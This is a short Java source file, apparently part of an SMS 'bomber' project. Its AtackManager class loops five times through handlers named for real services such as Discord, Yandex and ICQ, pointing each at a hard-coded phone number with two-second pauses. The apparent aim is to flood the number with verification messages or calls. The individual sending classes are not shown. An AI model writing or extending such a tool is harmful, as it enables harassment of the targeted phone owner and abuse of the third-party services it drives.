package com.example.bomber.service;

import com.example.bomber.service.UsingServices.*;

public class AtackManager {

    private SendingStrategy[] services;

    public AtackManager() {
        this.services=new SendingStrategy[]{new AbwBy(),new AvBy(),
                new Discord(), new ICQ(), new RealtBy(), new Yandex()
        };
    }

    public void main() {
        AtackContext context = new AtackContext("375291234567");
        int k=0;
        while(k<5) {
            for (int i = 0; i < services.length; i++) {
                context.setSendingStrategy(services[i]);
                context.executeStrategy();
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            k++;
        }

    }
}
